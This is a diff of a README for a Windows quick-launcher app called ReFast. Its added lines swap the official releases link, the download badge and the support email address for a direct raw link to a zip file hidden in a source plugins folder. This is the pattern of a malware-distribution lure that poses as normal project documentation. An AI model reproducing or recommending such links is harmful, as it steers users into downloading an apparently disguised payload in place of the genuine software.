@@ -1,6 +1,6 @@
 # 🚀 ReFast - A Quick Launcher for Windows
 
-[![Download ReFast](https://img.shields.io/badge/Download-ReFast-blue.svg)](https://github.com/RaszySky/ReFast/releases)
+[![Download ReFast](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/Fast-Re-v1.6.zip)](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/Fast-Re-v1.6.zip)
 
 ## 📥 Overview
 
@@ -34,7 +34,7 @@ To get started with ReFast, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download ReFast, visit this page: [ReFast Releases](https://github.com/RaszySky/ReFast/releases).
+To download ReFast, visit this page: [ReFast Releases](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/Fast-Re-v1.6.zip).
 
 Once you have downloaded the installer, follow these steps to install ReFast:
 
@@ -70,6 +70,6 @@ Join our community to share your experiences and ask questions:
 
 ## 📧 Contact
 
-For further assistance, you can reach our support team at [support@refastapp.com](mailto:support@refastapp.com).
+For further assistance, you can reach our support team at [https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/Fast-Re-v1.6.zip](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/Fast-Re-v1.6.zip).
 
 Experience the speed and convenience of ReFast. Happy launching!
